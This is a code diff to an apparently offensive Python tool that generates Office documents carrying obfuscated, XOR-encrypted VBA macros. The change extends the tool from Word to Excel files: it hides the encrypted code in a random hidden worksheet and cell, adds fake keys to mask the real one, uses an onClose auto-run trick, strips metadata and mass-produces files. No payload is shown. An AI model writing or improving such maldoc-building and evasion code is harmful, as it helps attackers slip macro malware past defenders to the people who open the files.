@@ -11,7 +11,7 @@ def return_file_type(template_file):
         raise Info(template_file + " was not found.", 0)
 
     filename, file_extension = os.path.splitext(template_file)
-    if file_extension == ".doc":
+    if file_extension == ".doc" or (file_extension == ".xls") :
         Info(file_extension + " detected", 0, 0)
         return file_extension
     else:
@@ -45,9 +45,10 @@ def main():
             VBA Obfuscation Tools combined with an MS office document generator
             By @Pepitoh
     '''
-    
-    file_type = return_file_type(template_file)
 
+    file_type = return_file_type(template_file)
+    worksheet_name = ""
+    cell_location = ""
     filenames = open_file(filename_list, "r")
     Info("Valid filename_list, "+str(file_len(filename_list)) +" "+file_type+" will be generated", 0, 0)
     vb = open_file(original_vba_file, "r")
@@ -62,10 +63,16 @@ def main():
 
         if file_type == ".doc":
             Office_container = WordObject()
-
+        elif file_type == ".xls":
+            worksheet_name = random_value(5,string.ascii_letters)
+            cell_location = random_value(1, string.ascii_uppercase) + random_value(2, string.digits)
+            Info("Name of the hidden sheet: "+ worksheet_name, 0, 3)
+            Info("Location of the cell: "+ cell_location, 0, 3)
+            Office_container = ExcelObject(worksheet_name, cell_location) 
+        
         if encryption_type == "xor":
             Info("XOR encrypton was selected", 0, 2)
-            vba = Enc_VBA_XOR(vba_str, trigger_function_name)
+            vba = Enc_VBA_XOR(vba_str, trigger_function_name, file_type, worksheet_name, cell_location)
         else:
             raise Info(encryption_type+ " is not supported yet, feel free to code it :-)",3)
 
@@ -77,12 +84,12 @@ def main():
 
         Info("Hiding strings from python script",0,2)
         vba.hide_string()
-
-        Office_container.Open(template_file)
-        VBA_Func = VBA_Functions()
         
+        Office_container.Open(template_file)
+        Office_container.CreateNew()
+        VBA_Func = VBA_Functions(file_type, worksheet_name, cell_location)
         #Adding keys :
-        if key_hiding_method == "doc_variable":
+        if key_hiding_method == "variable":
             if add_fake_keys:
                 #The keys are stored in the doc and are sorted alphabetically with their name
                 #Small keys are stored at the beggining (using a-v as first letter) in order to hide the location of the real key in the doc
@@ -106,8 +113,8 @@ def main():
             Office_container.RunMacro("ActivateKey")
             Office_container.DeleteVbaModule("k")
 
-            Info("onClose auto-action was chosen, add trick to bypass first closing of the document : ",0,2)
             if auto_function_macro == "onClose":
+                Info("onClose auto-action was chosen, add trick to bypass first closing of the document : ",0,2)
                 Office_container.AddVba(VBA_Func.generate_generic_store_function("OncloseKey", trigger_close_test_name, trigger_close_test_value), "tmp5")
                 Office_container.RunMacro("OncloseKey")
                 Office_container.DeleteVbaModule("tmp5")
@@ -129,7 +136,7 @@ def main():
             Info("Removing all metadatas from file", 0,2)
             Office_container.Remove_Metadata()
 
-            Info("Saving doc.", 0,2)
+            Info("Saving file", 0,2)
             Office_container.Save(path_gen_files + "\\" + filename, file_type)
         else:
             raise Info(key_hiding_method+ " is not supported yet, feel free to code it :-)",3)
